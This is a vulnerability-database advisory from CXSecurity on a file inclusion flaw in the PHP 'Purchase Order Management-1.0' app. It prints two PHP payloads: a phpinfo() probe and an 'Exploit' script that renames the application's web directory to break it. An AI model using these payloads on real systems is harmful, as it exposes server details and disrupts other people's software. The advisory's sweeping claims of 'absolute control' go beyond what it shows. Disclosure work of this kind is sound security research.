---
title: Purchase Order Management-1.0 Local File Inclusion
url: https://cxsecurity.com/issue/WLB-2023040029
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-07
fetch_date: 2025-10-04T11:29:08.496468
---

# Purchase Order Management-1.0 Local File Inclusion

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Purchase Order Management-1.0 Local File Inclusion** **2023.04.06**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-98](https://cxsecurity.com/cwe/CWE-98 "Click to see CWE-98")** | |

## Title: Purchase Order Management-1.0 - Local File Inclusion
## Author: nu11secur1ty
## Date: 03.06.2023
## Vendor: https://www.sourcecodester.com/user/257130/activity
## Software: https://www.sourcecodester.com/php/14935/purchase-order-management-system-using-php-free-source-code.html
## Reference: https://brightsec.com/blog/file-inclusion-vulnerabilities/
## Description:
The Purchase Order Management-1.0 suffer from File Inclusion Vulnerabilities.
The users of this system are allowed to submit input into files or
upload files to the server.
The malicious attacker can get absolute control of this system!
STATUS: CRITICAL Vulnerability
[+]Get Info:
```PHP
<?php
// by nu11secur1ty - 2023
phpinfo();
?>
```
[+]Exploit:
```PHP
<?php
// by nu11secur1ty - 2023
// Old Name Of The file
$old\_name = "C:/xampp7/htdocs/purchase\_order/" ;
// New Name For The File
$new\_name = "C:/xampp7/htdocs/purchase\_order\_stupid/" ;
// using rename() function to rename the file
rename( $old\_name, $new\_name) ;
?>
```
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/2023/Purchase-Order-Management-1.0)
## Proof and Exploit:
[href](https://streamable.com/vkq31h)
## Time spend:
00:35:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at
https://packetstormsecurity.com/https://cve.mitre.org/index.html and
https://www.exploit-db.com/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/
https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040029)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top